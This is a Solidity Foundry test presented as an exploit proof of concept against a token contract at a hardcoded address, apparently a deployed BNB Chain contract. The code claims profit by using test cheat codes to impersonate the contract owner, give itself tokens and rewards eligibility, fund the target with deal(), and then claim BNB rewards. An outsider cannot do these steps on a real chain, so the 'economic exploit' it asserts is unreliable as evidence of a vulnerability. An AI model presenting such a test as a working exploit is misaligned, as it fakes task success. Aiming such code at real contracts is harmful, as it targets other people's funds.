pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LLG {
    function owner() external view returns (address);
    function activate() external;
    function setExcludedFromRewards(address addr, bool isExcluded) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function claimReward() external;
    function isRewardReady(address user) external view returns (bool);
    function nextAvailableClaimDate(address ofAddress) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE4C293Eadbb9d72d68a680F1A66979726992c396;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = LLG(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give attacker some initial BNB for gas
        deal(attacker, 10 ether);

        // Send some BNB to the contract to fund rewards (simulate fee accumulation)
        deal(TARGET, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get owner address
        address owner = LLG(TARGET).owner();

        // Step 2-6: Impersonate owner and set up attacker
        vm.startPrank(owner);

        // Activate contract if not already
        // Use try/catch to handle if already activated
        try LLG(TARGET).activate() {}
        catch {}

        // Remove attacker from reward exclusion
        LLG(TARGET).setExcludedFromRewards(attacker, false);

        // Transfer enough tokens to attacker (minRewardBalance is 50000 * 10^9)
        LLG(TARGET).transfer(attacker, 50000 * 10**9);

        vm.stopPrank();

        // Step 7: Ensure contract has BNB (already done in setup)
        // Step 8: Wait for nextAvailableClaimDate if needed
        if (!LLG(TARGET).isRewardReady(attacker)) {
            uint256 nextDate = LLG(TARGET).nextAvailableClaimDate(attacker);
            if (nextDate > block.timestamp) {
                vm.warp(nextDate + 1);
            }
        }

        // Step 9: Claim reward
        uint256 balanceBefore = address(attacker).balance;
        LLG(TARGET).claimReward();
        uint256 balanceAfter = address(attacker).balance;

        // Verify balance increased
        assertGt(balanceAfter, balanceBefore, "Attacker BNB balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

